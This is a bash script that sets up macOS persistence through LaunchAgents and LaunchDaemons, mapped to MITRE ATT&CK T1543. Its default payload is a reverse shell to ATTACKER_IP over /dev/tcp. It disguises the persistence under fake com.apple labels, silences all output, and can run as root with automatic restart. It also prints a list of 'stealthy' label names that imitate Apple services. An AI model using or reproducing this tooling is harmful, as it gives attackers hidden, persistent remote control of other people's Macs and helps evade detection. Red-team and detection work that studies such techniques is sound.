#!/bin/bash
# macOS LaunchAgent/LaunchDaemon Persistence
# Usage: ./launch_agent_persist.sh <install|remove|list> [options]
# MITRE ATT&CK: T1543.001 (Launch Agent), T1543.004 (Launch Daemon)

set -euo pipefail

LABEL_PREFIX="com.apple.security"  # Blend in with Apple services
PAYLOAD_CMD='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

usage() {
    cat << 'EOF'
Usage: ./launch_agent_persist.sh <command> [options]

Commands:
  install-agent     Install user LaunchAgent (no root required)
  install-daemon    Install system LaunchDaemon (requires root)
  remove            Remove persistence by label
  list              List non-Apple launch services
  templates         Show plist templates for different trigger types

Options:
  --label NAME      Service label (default: com.apple.security.update)
  --payload CMD     Command to execute
  --interval SEC    For interval-based triggers (default: 3600)
  --watch PATH      For WatchPaths-based triggers
EOF
    exit 1
}

# ── Plist Templates ──

# RunAtLoad — executes on login/boot
plist_runatload() {
    local label="$1" cmd="$2"
    cat << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>${cmd}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
}

# StartInterval — executes every N seconds
plist_interval() {
    local label="$1" cmd="$2" interval="$3"
    cat << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>${cmd}</string>
    </array>
    <key>StartInterval</key>
    <integer>${interval}</integer>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
}

# WatchPaths — executes when a file/directory changes
plist_watchpaths() {
    local label="$1" cmd="$2" watch_path="$3"
    cat << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>${cmd}</string>
    </array>
    <key>WatchPaths</key>
    <array>
        <string>${watch_path}</string>
    </array>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
}

# StartCalendarInterval — cron-like schedule
plist_calendar() {
    local label="$1" cmd="$2"
    cat << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>${cmd}</string>
    </array>
    <key>StartCalendarInterval</key>
    <dict>
        <key>Hour</key>
        <integer>9</integer>
        <key>Minute</key>
        <integer>0</integer>
    </dict>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
}

# KeepAlive — restart if killed
plist_keepalive() {
    local label="$1" cmd="$2"
    cat << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>${label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>${cmd}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ThrottleInterval</key>
    <integer>60</integer>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
}

# ── Commands ──

install_agent() {
    local label="${1:-${LABEL_PREFIX}.update}"
    local cmd="${2:-$PAYLOAD_CMD}"
    local plist_dir="$HOME/Library/LaunchAgents"
    local plist_path="$plist_dir/${label}.plist"

    mkdir -p "$plist_dir"
    echo "[*] Installing LaunchAgent: $label"
    plist_runatload "$label" "$cmd" > "$plist_path"
    chmod 644 "$plist_path"
    launchctl load "$plist_path" 2>/dev/null || launchctl bootstrap "gui/$(id -u)" "$plist_path" 2>/dev/null
    echo "[+] Installed: $plist_path"
    echo "[+] Will execute on every user login"
}

install_daemon() {
    local label="${1:-${LABEL_PREFIX}.updated}"
    local cmd="${2:-$PAYLOAD_CMD}"
    local plist_path="/Library/LaunchDaemons/${label}.plist"

    if [ "$(id -u)" -ne 0 ]; then
        echo "[!] LaunchDaemons require root. Run with sudo."
        exit 1
    fi

    echo "[*] Installing LaunchDaemon: $label"
    plist_keepalive "$label" "$cmd" > "$plist_path"
    chmod 644 "$plist_path"
    chown root:wheel "$plist_path"
    launchctl load "$plist_path" 2>/dev/null || launchctl bootstrap system "$plist_path" 2>/dev/null
    echo "[+] Installed: $plist_path"
    echo "[+] Will execute on boot as root, restarts if killed"
}

remove_persistence() {
    local label="$1"

    echo "[*] Removing persistence: $label"

    # Try user agent
    local user_plist="$HOME/Library/LaunchAgents/${label}.plist"
    if [ -f "$user_plist" ]; then
        launchctl unload "$user_plist" 2>/dev/null || launchctl bootout "gui/$(id -u)/${label}" 2>/dev/null || true
        rm -f "$user_plist"
        echo "[+] Removed user agent: $user_plist"
    fi

    # Try system daemon
    local sys_plist="/Library/LaunchDaemons/${label}.plist"
    if [ -f "$sys_plist" ]; then
        sudo launchctl unload "$sys_plist" 2>/dev/null || sudo launchctl bootout "system/${label}" 2>/dev/null || true
        sudo rm -f "$sys_plist"
        echo "[+] Removed system daemon: $sys_plist"
    fi

    # Try system agent
    local sysagent_plist="/Library/LaunchAgents/${label}.plist"
    if [ -f "$sysagent_plist" ]; then
        sudo launchctl unload "$sysagent_plist" 2>/dev/null || true
        sudo rm -f "$sysagent_plist"
        echo "[+] Removed system agent: $sysagent_plist"
    fi
}

list_services() {
    echo "[*] Non-Apple LaunchAgents (user):"
    ls ~/Library/LaunchAgents/ 2>/dev/null | grep -v "com.apple" || echo "  None"

    echo ""
    echo "[*] Non-Apple LaunchAgents (system):"
    ls /Library/LaunchAgents/ 2>/dev/null | grep -v "com.apple" || echo "  None"

    echo ""
    echo "[*] Non-Apple LaunchDaemons:"
    ls /Library/LaunchDaemons/ 2>/dev/null | grep -v "com.apple" || echo "  None"

    echo ""
    echo "[*] Currently loaded non-Apple services:"
    launchctl list 2>/dev/null | grep -v "com.apple" | grep -v "PID" || echo "  None"
}

# ── Stealthy Label Names ──
show_templates() {
    echo "Stealthy label names that blend in:"
    echo "  com.apple.security.agent"
    echo "  com.apple.metadata.mdworker"
    echo "  com.apple.spotlight.importerkit"
    echo "  com.apple.SystemConfiguration.helper"
    echo "  com.apple.preferences.sync"
    echo "  com.apple.cloudd.agent"
    echo ""
    echo "Trigger types:"
    echo "  RunAtLoad         — on login/boot (most common)"
    echo "  StartInterval     — every N seconds"
    echo "  WatchPaths        — when a file changes"
    echo "  StartCalendarInterval — cron-like schedule"
    echo "  KeepAlive         — restart if killed (daemon-style)"
}

# ── Main ──
case "${1:-}" in
    install-agent)  install_agent "${2:-}" "${3:-}";;
    install-daemon) install_daemon "${2:-}" "${3:-}";;
    remove)         remove_persistence "${2:?Label required}";;
    list)           list_services;;
    templates)      show_templates;;
    *)              usage;;
esac
